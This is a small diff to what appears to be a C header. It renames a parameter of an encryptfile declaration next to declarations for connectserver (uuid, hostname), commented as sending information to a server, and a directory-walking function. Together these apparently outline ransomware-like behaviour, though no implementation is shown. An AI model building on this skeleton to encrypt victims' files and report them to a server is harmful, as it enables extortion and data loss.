@@ -7,7 +7,7 @@
 	//send information to server
 	void connectserver(char *uuid, char *hostname);
 
-	void encryptfile(char *encryptfile);
+	void encryptfile(char *file_to_encrypt);
 
 	void WhatIsDir(char *name_dir);
 
